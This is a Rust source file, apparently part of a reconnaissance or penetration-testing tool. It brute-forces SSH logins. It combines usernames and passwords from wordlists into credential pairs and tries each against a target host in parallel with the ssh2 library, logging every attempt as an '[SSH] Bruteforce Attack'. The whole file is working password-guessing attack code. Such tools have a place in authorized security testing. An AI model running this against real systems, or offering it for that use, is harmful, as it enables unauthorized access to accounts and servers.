use rayon::prelude::*;
use ssh2::Session;
use std::{
    io::{Error, ErrorKind},
    net::{SocketAddr, TcpStream},
    time::Duration,
};

use crate::helpers::wordlists;

// Define a credential structure
#[derive(Debug, Clone)]
pub struct Credential {
    pub hostname: String,
    pub port: u16,
    pub username: String,
    pub password: String,
}

impl Credential {
    #[warn(dead_code)]
    pub fn new(hostname: String, port: u16, username: String, password: String) -> Self {
        Self {
            hostname,
            port,
            username,
            password,
        }
    }
}

// Main function to test credentials concurrently
pub fn recon(
    hostname: String,
    port: u16,
    timeout: Duration,
) -> Vec<(Credential, Result<(), Error>)> {
    let users = wordlists::get_users();
    let passwords = wordlists::get_passwords();

    let mut creds = Vec::new();

    for user in users {
        for pass in passwords.clone() {
            creds.push(Credential {
                hostname: hostname.clone(),
                port,
                username: user.clone(),
                password: pass.clone(),
            });
        }
    }

    creds
        .into_par_iter()
        .map(|cred|  { 
            let _cred = cred.clone();
            println!("[SSH] Bruteforce Attack | username: {} | password: {}",_cred.username,_cred.password);
            (_cred, connect(cred.clone(), timeout))
         })
        .collect()
}

// Function to test a single SSH connection
fn connect(cred: Credential, timeout: Duration) -> Result<(), Error> {
    // Parse server address
    let addr_str = format!("{}:{}", cred.hostname, cred.port);
    let addr: SocketAddr = addr_str
        .parse()
        .map_err(|e| Error::new(ErrorKind::InvalidInput, e))?;

    // Establish TCP connection with timeout
    let tcp = TcpStream::connect_timeout(&addr, timeout)?;
    tcp.set_read_timeout(Some(timeout))?;
    tcp.set_write_timeout(Some(timeout))?;

    // Create SSH session
    let mut sess = Session::new().map_err(|e| Error::new(ErrorKind::Other, e))?;
    sess.set_tcp_stream(tcp);
    sess.set_timeout(timeout.as_millis() as u32);
    sess.handshake()
        .map_err(|e| Error::new(ErrorKind::Other, e))?;

    // Authenticate with password
    sess.userauth_password(&cred.username, &cred.password)
        .map_err(|e| Error::new(ErrorKind::PermissionDenied, e))?;

    if sess.authenticated() {
        Ok(())
    } else {
        Err(Error::new(
            ErrorKind::PermissionDenied,
            "Authentication failed",
        ))
    }
}
